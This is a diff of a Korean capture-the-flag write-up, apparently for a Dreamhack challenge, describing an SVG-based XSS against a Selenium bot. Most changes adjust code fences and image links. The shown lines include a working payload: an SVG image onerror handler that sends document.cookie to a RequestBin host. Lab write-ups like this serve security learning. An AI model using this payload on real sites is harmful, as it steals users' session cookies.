@@ -72,8 +72,8 @@ DOMParser가 XML 파싱 에러(<parsererror>)를 내지 않도록 속성 값 내
 SvgMover 로직 오류를 방지하기 위해 <path> 태그를 구문에 함께 포함하여 exploit.svg를 작성합니다.
 https://tools.dreamhack.games/ 사용
 
-```
-<?xml version="1.0" encoding="UTF-8"?>
+
+```<?xml version="1.0" encoding="UTF-8"?>
 
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
 
@@ -81,9 +81,7 @@ https://tools.dreamhack.games/ 사용
 
   <image href="x" onerror="location.href=&apos;http://knzgsym.request.dreamhack.games/?flag=&apos;+encodeURIComponent(document.cookie)"/>
 
-</svg> 
-
-```
+</svg>```
 
 ---
 
@@ -95,13 +93,13 @@ main.py 검증 로직을 통과하고, 동기식으로 실행된 Selenium 봇에
 RequestBin(knzgsym.request.dreamhack.games) 수신 로그의 Referer 헤더 쿼리 스트링에서 URL 인코딩된 값 확인:
 
 
-![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/2b0e0b27fb1ea6e77e7c3091bef245e9502d8da606b44e1d0a70d3f900b5f047.png)
+![alt text](image-7.png)
 
 
 URL 디코딩 수행 후 최종 FLAG 획득:
 flag를 획득 할 수 있었다.
 
-![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/db6a01cd706e577440b8c448b9037b965a6bdbf9999ce4726ae93c529a4bcbe7.png)
+![alt text](image-4.png)
 
 
 ---
